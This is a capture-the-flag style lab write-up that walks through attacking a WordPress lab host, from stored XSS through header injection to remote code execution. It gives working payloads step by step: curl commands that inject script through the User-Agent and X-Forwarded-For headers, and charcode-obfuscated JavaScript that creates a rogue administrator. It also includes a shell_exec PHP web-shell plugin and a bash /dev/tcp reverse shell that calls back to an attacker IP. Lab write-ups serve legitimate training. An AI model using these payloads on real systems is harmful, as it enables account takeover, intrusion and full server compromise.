# 🧪 Capstone Lab – Web Application Attacks (XSS → Admin → RCE)

This capstone walk-through focuses on abusing reflected XSS to gain admin access to a WordPress site, upload a reverse shell plugin, and establish RCE.

---

## 🖥️ Step 1: Fix Hostname Resolution

The target web app wouldn’t load correctly until the hostname was resolved manually.

### 🔧 Add Target to `/etc/hosts`

```bash
sudo nano /etc/hosts
```

Add entry:

```
192.168.191.65    offsecwp
```

---

## 📡 Step 2: XSS Header Injection Testing via Curl

Rather than loading Burp Suite, we used `curl` to test headers manually.

### 🧪 Test X-Forwarded-For Header with Inline JavaScript

```bash
curl -i http://offsecwp/ -H "X-Forwarded-For: <script>alert('XFF')</script>"
```

### ✅ Why This Works:

- We identified that both `User-Agent` and `X-Forwarded-For` headers are vulnerable.
- The backend admin panel reads header values and reflects them unsanitized into the DOM.
- The application does not properly filter the following characters:
  ```
  < > ' " { } ;
  ```

---

## 💥 Step 3: Triggering Stored XSS

When the admin visits the **Visitors tab**, the script injected via `User-Agent` or `XFF` executes.

### Example Payload:

```bash
curl -i http://offsecwp/ -H "User-Agent: <script>alert(42)</script>"
```

Once an admin views the dashboard, it executes — giving us the ability to escalate.

---

## 🧑‍💻 Step 4: Injecting JavaScript to Create an Admin User

Used JavaScript to perform an AJAX request to create a new admin user.

### 🛠️ Original JavaScript:

```javascript
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

### 🗜️ Minified JavaScript:

Compressed using:
```
https://jscompress.com/
```

### 🧬 Encoded to CharCodes:

In Firefox DevTools:

```javascript
function encode_to_javascript(string) {
    var output = '';
    for (let pos = 0; pos < string.length; pos++) {
        output += string.charCodeAt(pos);
        if (pos !== string.length - 1) {
            output += ",";
        }
    }
    return output;
}

let encoded = encode_to_javascript('INSERT_MINIFIED_JS_HERE');
console.log(encoded);
```

---

## 🎯 Step 5: Delivering the Payload via Header

Use the encoded string with `eval(String.fromCharCode(...))` to execute the JS payload.

```bash
curl -i http://offsecwp \
  --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,...,59))</script>" \
  --proxy 127.0.0.1:8080
```

> This executes the AJAX request, creating a new admin account:  
**Username:** `attacker`  
**Password:** `attackerpass`

---

## 📦 Step 6: Gaining RCE via Malicious Plugin Upload

Logged in using the new admin credentials and uploaded a **custom reverse shell plugin**.

### 🐚 `revshell.php` Plugin:

```php
<?php
/*
Plugin Name: ReverseShell
*/
if (isset($_GET['cmd'])) {
  echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

### 📦 Zip and Upload:

```bash
zip revshell.zip revshell.php
```

Then upload through the **Plugins → Add New → Upload Plugin** section.

### Activate plugin.

---

## 🧪 Step 7: Test Command Execution

Confirm it's live:

```bash
http://offsecwp/wp-content/plugins/revshell.php?cmd=whoami
```

### Output:
```
www-data
```

---

## 🛰️ Step 8: Reverse Shell Execution

Start Netcat listener:

```bash
nc -lvnp 4444
```

Then trigger shell via plugin:

```bash
http://offsecwp/wp-content/plugins/revshell.php?cmd=bash+-c+'bash+-i+%3E%26+/dev/tcp/192.168.45.236/4444+0%3E%261'
```

---

## 🏁 Step 9: Loot the Flag

Once inside the shell:

```bash
cd /tmp
ls
cat flag.txt
```

---

## ✅ Summary

| Stage            | Action                                       | Tool        |
|------------------|----------------------------------------------|-------------|
| Hostname Fix     | `/etc/hosts`                                 | nano        |
| XSS Discovery    | Header injection via `curl`                  | curl        |
| JS Injection     | AJAX to create admin user                    | browser console |
| RCE              | Upload PHP plugin via WP admin panel         | browser     |
| Reverse Shell    | Bash TCP payload → Netcat catch              | nc, curl    |
| Final Flag       | Retrieved via shell access                   | bash        |

---

**Capstone lab complete. Full chain from XSS to RCE via custom plugin exploitation.** 💥
